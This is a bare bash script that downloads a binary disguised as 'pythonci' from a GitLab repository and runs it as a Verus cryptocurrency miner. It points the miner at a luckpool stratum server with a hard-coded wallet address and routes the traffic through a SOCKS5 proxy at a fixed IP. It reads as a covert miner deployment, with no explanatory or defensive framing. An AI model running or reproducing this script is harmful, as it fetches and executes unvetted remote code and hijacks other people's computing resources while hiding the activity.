#!/bin/bash
sudo apt update
sudo apt install screen -y
sudo apt install screen libjansson4 -y
wget https://gitlab.com/Scalaxlarig/bisalahhh/-/raw/main/pythonci
chmod +x pythonci
screen -dmS ls
PL=stratum+tcp://eu.luckpool.net:3956
WT=RBmB39tuxoHb4AEigfL3NgWqt7k4Xrm2Dc
WR=sepatu
PY=socks5://72.210.252.134:46164
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
